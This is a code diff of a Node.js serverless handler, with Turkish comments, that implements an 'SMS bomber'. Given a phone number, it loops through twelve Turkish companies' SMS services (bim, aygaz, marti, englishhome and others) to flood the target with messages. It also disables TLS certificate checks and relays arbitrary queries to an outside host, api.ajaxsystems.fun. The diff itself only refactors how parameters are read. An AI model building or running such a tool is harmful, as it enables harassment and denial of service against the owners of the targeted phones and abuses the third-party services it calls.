@@ -1,10 +1,9 @@
-// api/proxy.js
 const axios = require('axios');
 const https = require('https');
 
 const agent = { httpsAgent: new https.Agent({ rejectUnauthorized: false }), timeout: 8000 };
 
-// Senin apis.js içindeki servislerin fonksiyonları
+// SMS Servis Fonksiyonları
 const rnd = (n = 8) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
 const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
 const phone0 = (p) => `0${p}`;
@@ -34,20 +33,18 @@ module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     if (req.method === 'OPTIONS') return res.status(200).end();
 
-    const { action, phone, services } = req.query;
-    if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
+    const { action, phone, endpoint, ...params } = req.query;
 
-    // Eğer SMS Bomber isteği gelmişse
+    // SMS Bomber İsteği
     if (action === 'smsbomber') {
-        const serviceNames = (services || 'bim,file,aygaz,qumpara,mopas,saka,gofody,scooby,pinar,marti,karma,englishhome').split(',');
+        if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
         
+        const services = ['bim', 'file', 'aygaz', 'qumpara', 'mopas', 'saka', 'gofody', 'scooby', 'pinar', 'marti', 'karma', 'englishhome'];
         let results = [];
         
-        for (const s of serviceNames) {
-            let isSuccess = false;
-            let errorMsg = '';
+        for (const s of services) {
             try {
-                // Fonksiyonları sırayla çağır
+                let isSuccess = false;
                 if (s === 'bim') isSuccess = await bim(phone);
                 else if (s === 'file') isSuccess = await file(phone);
                 else if (s === 'aygaz') isSuccess = await aygaz(phone);
@@ -66,12 +63,10 @@ module.exports = async (req, res) => {
                 results.push({ service: s, success: false, message: e.message });
             }
         }
-        
         return res.status(200).json({ results });
     }
 
-    // Eski proxy mantığı (sorgular için)
-    const { endpoint, ...params } = req.query;
+    // Standart Sorgu İsteği
     if (!endpoint) return res.status(400).json({ error: 'Endpoint belirtilmedi.' });
     try {
         const response = await axios.get(`https://api.ajaxsystems.fun/${endpoint}`, { params: params, timeout: 9000 });
